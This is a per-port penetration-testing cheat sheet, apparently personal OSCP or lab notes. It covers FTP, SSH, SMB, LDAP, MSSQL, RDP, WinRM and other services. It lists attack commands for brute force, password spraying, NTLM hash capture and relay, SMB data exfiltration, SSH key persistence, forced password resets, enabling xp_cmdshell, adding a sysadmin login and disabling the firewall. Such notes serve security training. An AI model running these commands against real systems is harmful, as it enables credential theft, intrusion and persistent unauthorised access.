
## Initial Recon via NMAP and Rustscan

* Rustscan

```text
export IP=
```

```text
rustscan -a $IP -t 2000 --ulimit 5000
```

* NMAP

```text
nmap -sC -sV -Pn -vv -p 21,22,25,53,80,88,111,135,139,389,443,445,464,593,636,1433,1760,2049,3268,3269,3306,3389,5985,9389,32771,47001 $IP
```

```
nmap -sC -sV -Pn -vv -p- $IP --open
```

* check if any unknown ports make sense here https://github.com/pha5matis/Pentesting-Guide/blob/master/list_of_common_ports.md 

## 21 - FTP

* Check for Anonymous access

```text
export IP=$IP
```

```text
ftp anonymous@$IP
```

* Check for default usernames and passwords such as `root:root` `admin:password` `admin:admin`

* Brute force with known users.

```text
hydra -l users.txt -p /usr/share/wordlists/rockyou.txt ftp://$IP -vv
```

```text
nxc ftp $IP -u users.txt -p users.txt #--continue-on-success --timeout
```

* Check for null,login same as pass and reverse the login as pass

```text
hydra -l users.txt -e nsr ftp://$IP
```

* Turn of passive mode by typing `passive` into the prompt

* Recursively get the ftp directories

```
wget -r ftp://username@password@$IP/dir/*
```

* To upload files `put` and to download `get`
* The exploit I failed to find at first attempt [uftp-dirtrav-exp]()

## 22 - SSH

* brute force
```
hydra -l users.txt -p /usr/share/wordlists/rockyou.txt ssh://$IP -vv
```

* Check for default usernames and passwords such as `root:root` `admin:password` `admin:admin`
* Check for Null, Login same as Pass and Reverse the login as pass via `-e nsr`

```text
hydra -l users.txt -e nsr ssh://$IP -vv
```

* check for `/home/user/.ssh/id_rsa` and change it's permissions with `chmod 600 id_rsa`

```text
ssh -i id_rsa user@$IP
```

* If the id_rsa requires password, use `ssh2john id_rsa id_rsa_hash` then use john as below

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash
```

* Config files
```text
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```

* maintain access with

```text
ssh-keygen
```

* Copy the generated id_rsa.pub to  the authorized_keys

```text
echo your_public_key >> ~/.ssh/authorized_keys
```

* File Transfers Upload to the box

```text
scp file.ext user@$IP:/home/user/
```

* File Transfers Download from the box

```text
scp rzgami@kali:/home/rzgami/oscp/ /etc/something
```

* Local Port Forwarding

```
ssh -L 8080:127.0.0.1:80 user@$IP
```

* Remote Port Forwarding

```
ssh -R 8080:127.0.0.1:80 user@$IP
```


## 25 - SMTP

* Enumeration via nmap 

```text
nmap -p25 --script smpt-commands $IP -vv
```

```text
nmap -p25 --script smtp-open-relay $IP -vv
```

```text
nmap -p25 --script smtp-enum-users $IP -vv
```

```
nmap -p24 --script smtp-ntlm-info --script-args smtp-ntlm-info.fingerprint=on $IP -vv
```

* Check Mail Exchange Records

```text
dig +short mx $IP
```

*  check for open relay

```
telnet $IP 25
MAIL FROM:<test@example.com>
RCPT TO:<test2@anotherexample.com>
DATA
Subject: Test open relay
Test message
.
QUIT
```

* SMTP Commands 

```
EHLO
MAIL FROM: <sender@example.com>
RCPT TO: <recipient@example.com>
DATA
RSET
VRFY
EXPN
NOOP
QUIT
```

* Send emails

```
# mutt
echo "<Body>" | mutt -s "<Subject>" <Recipient> -r <Recipient> -a <Attachment>          

# SendEmail
sendEmail -t <Recipient> -f <SendingAddress> -s <IP> -u <Subject> -a <Attachment> 

# Swaks
swaks -s "<Server>"  -t "<Recipient>" -f "<FromAddress>" --header "Subject:" --body "" --attach <Attachment>
```


* check [Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html?highlight=smtp%20enumeration#enumeration) for more
* [hacktricks-boitatech](https://hacktricks.boitatech.com.br/pentesting/pentesting-smtp) 


## 25 - SNMP

* Enumeration

```
sudo nmap -sU -p161 -sV $IP -vv
```

```
nmap -vv -sV --version-intensity=5 -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP
```

```
onesixtyone $IP public
```

```
snmpcheck $IP -c public
```

```
snmpwalk -v 2c -c public $IP
```

```
snmpbulkwalk -Cr1000 -c public -v2c $IP > snmp-full-bulk.txt
```

* _From HTB Pandora_

```python
#!/usr/bin/env python3

import re
import sys
from collections import defaultdict
from dataclasses import dataclass


@dataclass
class Process:
    """Process read from SNMP"""
    pid: int
    proc: str
    args: str = ""

    def __str__(self) -> str:
        return f'{self.pid:04d} {self.proc} {self.args}'


with open(sys.argv[1]) as f:
    data = f.read()

processes = {}

for match in re.findall(r'HOST-RESOURCES-MIB::hrSWRunName\.(\d+) = STRING: "(.+)"', data):
    processes[match[0]] = Process(int(match[0]), match[1])

for match in re.findall(r'HOST-RESOURCES-MIB::hrSWRunParameters\.(\d+) = STRING: "(.+)"', data):
    processes[match[0]].args = match[1]

for p in processes.values():
    print(p)
```

```python
python snmp_processlist.py snmp-full
```

* [Hacktricks](https://hacktricks.boitatech.com.br/pentesting/pentesting-snmp)


## 53 DNS

* Enumerate with dig and nmap

```
dig '<Domain>'
dig '<Domain>' A
dig '<Domain>' AAAA
dig '<Domain>' PTR
dig '<Domain>' NS
dig '<Domain>' MX
```

```
nmap --script dns-brute --script-args dns-brute.threads=12 '<Domain>'
```


* DNSCHEF for bloodhound

```
dnschef --fakeip ms01
```

## 88-Kerberos

* Enumeration

```
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=<Domain>,userdb=<Wordlist> <IP>
```

* With Kerbrute

```
./kerbrute userenum <UserList> --dc <IP> --domain <Domain>
```

* With Rubeus

```
# with a list of users
.\Rubeus.exe brute /users:<UserList> /passwords:<Wordlist> /domain:<Domain>

# Check all domain users again password list
.\Rubeus.exe brute /passwords:<Wordlist>
```

## 135,593 - RPC

* Enumeration

```
nmap --script=msrpc-enum -p 135,593 $IP
```

```
enum4linux-ng -a $IP
```

* Anonymous Connect

```
rpcclient -u '' -N $IP
```

```
rpcclient -u '' -N -p 593 $IP
```

* Connect

```
rpcclient -u user $IP
```

```
rpcclient -W workgroup -u user $IP
```

```
rpcclient -u username -N $IP
```

```
rpcclient -u user --pw-nt-hash $IP
```

```
rpcclient -k $IP #kerbauth
```

* Commands

```
srvinfo

enumdomusers

enumdomgroups

enumdomains

enumalsgroup builtin

getusername

lsaenumid

lsaquery

netshareenumall

lookupsids <sid>

lookupnames <name>

queryuser <rid/name>

querygroupmem <rid>

getdompwinfo
```

```
rpcclient -c "cmd1,cmd2" $IP
```

* impacket-rpcdump

```
impacket-rpcdump -port 135 $IP
```
 
* Force Change Password

```
rpcclient -U $DOMAIN/$ControlledUser $DomainController
rpcclient $> setuserinfo2 $TargetUser 23 $NewPassword
```

* [exploit-notes](https://exploit-notes.hdks.org/exploit/windows/protocol/msrpc-pentesting/)
* [hackviser](https://hackviser.com/tactics/pentesting/services/msrpc)
* [thehackerrecipes](https://www.thehacker.recipes/ad/recon/ms-rpc)

## 139,445 - SMB

* Enumeration

```
enum4linux-ng -a $IP
```


```
nmap -p 445 --script smb-protocols $IP
```

* List Shares anonymously

```
nxc smb $IP -u '' -p '' --shares
```

```
smbclient -N -L \\$IP\
```

* List Shares via Guest account

```
nxc smb $IP -u 'guest' -p '' --shares
```

```
smbclient -U 'guest' -L \\$IP\
```

* With credentials or guest or null access check for users

```
nxc smb $IP -u user -p passwd --users
```

* rid cycling via rid-brute

```
nxc smb $IP -u user -p passwd --rid-brute
```

*  Password Spraying

```
nxc smb $IP -u users.txt -p pass.txt --continue-on-success
```

```
nxc smb $IP -u users.txt -p pass.txt --continue-on-success
```

```
nxc smb $IP -u users.txt -H hash.txt --continue-on-success
```

* Make sure to lowercase the uppercase usernames of users and service accounts while password spraying

```
hydra -L users.txt -P pass.txt -V -f smb
```

* Data exfil via smbclient of nxc spider

```
mask ""
recurse on
prompt off
mget *
```

```
nxc smb $IP -u user -p password -M spider_plus -o READ_ONLY=False
```

*  NTLM-Theft

```
python3 ntlm_theft.py -g all -s tun0-IP -f test
```

* Capture NTLM hash via Responder and impacket-smbserver

```
sudo responder -I tun0
```

```
impacket-smbserver -smb2support share .
```

* smb relay attack

```
nxc smb $IP (verify signing is false)
```

```
impacket-smbrelayx -tf 10.10.144.21 -i
```

```
nc 127.0.0.1 11000
```

* Then we can use shares if smb or use mssql commands if the return is mssql

*  nxc smb-relay

```
nxc smb --gen-relay-list hosts.txt
```

* change smbpasswd
```
smbpasswd -U user -r domain.com
```

* Mount Shares

```
sudo mount -t cifs //$Ip/share /tmp/mnt/
```

* Umount Share

```
sudo umount /mnt/point
```

* check for Netapi, Eternal Blue and  SMB Ghost


## 389,636,1760,3268,3269 LDAP

* Enum4linux-ng
```
enum4linux-ng -a $IP
```

* Enumeration with ldapsearch

```
ldapsearch -h $IP -x -b "" -s base \* +
```

```
ldapsearch -x -H ldap://$IP -s base namingcontexts
```

```
ldapsearch -x -b "dc=doman,dc=com" -H ldap://$IP
```

```
ldapsearch -x -b "dc=domain,dc=com" -h $IP -p 389 '(ObjectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
```

```
ldapsearch -x -b "dc=domain,dc=com" -h <IP> -p 389 | grep -i -a 'Service Accounts'
```

```
ldapsearch -h <LDAP-server> -p <port> -x -b "<base-DN>" "(objectclass=*)"
```

*  [ad-ldap-enum](git clone https://github.com/CroweCybersecurity/ad-ldap-enum.git)

```
python3 ad-ldap-enum.py -d contoso.com -l 10.0.0.1 -u Administrator -p P@ssw0rd
```

* [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump.git)

```
ldapdomaindump.py [-h] [-u USERNAME] [-p PASSWORD] [-at {NTLM,SIMPLE}] [-o DIRECTORY] [--no-html] [--no-json] [--no-grep] [--grouped-json] [-d DELIMITER] [-r] [-n DNS_SERVER] [-m] HOSTNAME
```

```
python3 ldapdomaindump.py --user "domain\\user" -p "password" ldap://DomainControllerIP:389 --no-json --no-grep -o output
```

```
ldapdomaindump --user 'DOMAIN\USER' --password $PASSWORD --outdir ldapdomaindump $DOMAIN_CONTROLLER
```

```
ldapdomaindump --user "domain.com\user" -p "password" ldap://domain.com:389 -o output
```

* With `ldapsearch-ad`

```
ldapsearch-ad --type all --server $DOMAIN_CONTROLLER --domain $DOMAIN --username $USER --password $PASSWORD\
```

```
ldapsearch-ad --type info --server $DOMAIN_CONTROLLER --domain $DOMAIN --username $USER --password $PASSWORD
```

* NXC

* lists pki and CAs
```
nxc ldap "domain_controller" -d "domain" -u "user" -p "password" -M adcs
```

* get users descriptions (can find passwords in them)

```
nxc ldap "domain_controller" -d "domain" -u "user" -p "password" -M get-desc-users
```

* get machine account quota (for rbdc)

```
nxc ldap "domain_controller" -d "domain" -u "user" -p "password" -M maq
```


* [Infosec-Warrior](https://github.com/InfoSecWarrior/Offensive-Pentesting-Host/blob/main/LDAP/README.md)
* [nirajkharel](https://github.com/nirajkharel/AD-Pentesting-Notes)


## 1433 - MSSQL

* Enumeration via nmap

```
nmap --script ms-sql-info -p 1433 $IP
nmap --script ms-sql-config -p 1433 $IP
nmap --script ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 $IP
nmap --script ms-sql-* -p 1433 $IP
```

* Brute Force

```
nxc mssql $IP -u users.txt -p pass.txt --continue-on-success --local-auth
```

```
nxc mssql $IP -u users.txt -p pass.txt --continue-on-success
```

```
nxc mssql $IP -u users.txt -H hash.txt --continue-on-success --local-auth
```

```
nxc mssql $IP -u users.txt -H hash.txt --continue-on-success 
```

```
hydra -L usernames.txt -p password $IP mssql
```

```
hydra -l username -p passwords.txt $IP mssql
```


* Password Spraying

```
nxc mssql $IP -u users.txt -p password --no-brute --continue-on-success --local-auth
```

```
nxc mssql $IP -u users.txt -p password --no-brute --continue-on-success
```

```
nxc mssql $IP -u users.txt -H hash --no-brute --continue-on-success --local-auth
```

```
nxc mssql $IP -u users.txt -H hash --no-brute --continue-on-success
```


* Connect via impacket-mssqlclient 

```
impacket-mssqlclient user:password@$IP
```

```
impacket-mssqlclient -windows-auth user:password@$IP
```

```
impacket-mssqlclient -k -no-pass user@$IP #kerberos
```

```
impacket-mssqlclient -windows-auth user:@$IP -hashes :NTHASH #ntlm-auth
```

* Connect via sqsh

```
sqls -S $IP -U user -P password
```

* Commands 

```
# Get the version of MSSQL
> SELECT @@version

# Get current username
> SELECT user_name()

# Get all users
> SELECT * FROM sys.database_principals

# Get databases
> SELECT * FROM master.dbo.sysdatabases

# Switch to the database
> USE <database>

# List tables
> SELECT * FROM information_schema.tables

# Get table content
> SELECT * FROM <database_name>.dbo.<table_name>


# Check if the current user have permission to execute OS command
> USE master
> EXEC sp_helprotect 'xp_cmdshell'

# Get linked servers
> EXEC sp_linkedservers
> SELECT * FROM sys.servers

# Create a new user with sysadmin privilege
> CREATE LOGIN tester WITH PASSWORD = 'password'
> EXEC sp_addsrvrolemember 'tester', 'sysadmin'

# List directories
> xp_dirtree '.\'
> xp_dirtree 'C:\inetpub\'
> xp_dirtree 'C:\inetpub\wwwroot\'
> xp_dirtree 'C:\Users\'

# Assume that the 'sa' user can be impersonated.
EXECUTE AS 'sa'
EXEC xp_cmdshell 'whoami'
```

* Enable xp_cmd_shell

```
> enable_xp_cmdshell
> disable_xp_cmdshell
```

```
# Enable advanced options
> EXEC sp_configure 'show advanced options', 1;
# Update the currently configured value for the advanced options
> RECONFIGURE;
# Enable the command shell
> EXEC sp_configure 'xp_cmdshell', 1;
# Update the currently configured value for the command shell
> RECONFIGURE;
```

*  use xp_dirtree for ntlm theft via responder or smbserver

```
xp_dirtree \\tun0-ip\share
```

* msdat
```
# MSDAT: https://github.com/quentinhardy/msdat
# all: Enumerate with all modules
python3 msdat.py all -s example.com
# -D, -U, -P: Use Windows authentication
python3 msdat.py all -s example.com -D domain -U username -P password
# xpdirectory: List directories in system
python3 msdat.py xpdirectory -s manager.htb -D manager -U operator -P operator -d master --list-files 'C:\'
# bulkopen: Read/download files
python3 msdat.py bulkopen -s example.com -D domain -U username -P password -d database --rea
```

## 2049 - NFS

* just list and mount

```
showmount -e $IP
```

```
sudo mount -t nfs $IP:/share /tmp/mnt
```


## 3389

* Enumeration

```
nmap -p 3389 --script rdp-enum-encryption $IP
```

* Connect with null creds

```
xfreerdp /V:$IP -sec-nla /cert-ignore +clipboard
```

* Connect 

```
xfreerdp /V:$IP /u:user /p:password +clipboard /cert-ignore /dynamic-resolution
```

* Enable RDP
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
```

```
netsh advfirewall set allprofiles state off
```

* OR

```
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
```

```
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d 0x00000001 /f
```

```
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

* OR via nxc

```
nxc smb $IP -u Administrator -p password -M rdp -o ACTION=enable
```

* BruteForce

```
hydra -l username -P passwords.txt $IP rdp
```

```
hydra -L users.txt -p password $IP rdp
```

```
nxc rdp $IP -u username -p pass.txt --continue-on-success --rdp-timeout 30
```

* Check for bluekeep

## 5985-WinRM

* Brute Force

```
nxc winrm $IP -u users.txt -p pass.txt --continue-on-success
```

```
nxc winrm $IP -u users.txt -H hash --continue-on-success
```

* us `-x 'whoami'`  for verifying command execution

* Evil-Winrm

```
evil-winrm -i $IP -u user -p pass
```

```
evil-winrm -i $IP -u user -H hash
```

```
evil-winrm -i $IP -S -k private.key -c public.key
```

* Use `upload` and `download` commands to upload and download files
* Use `services` command to list services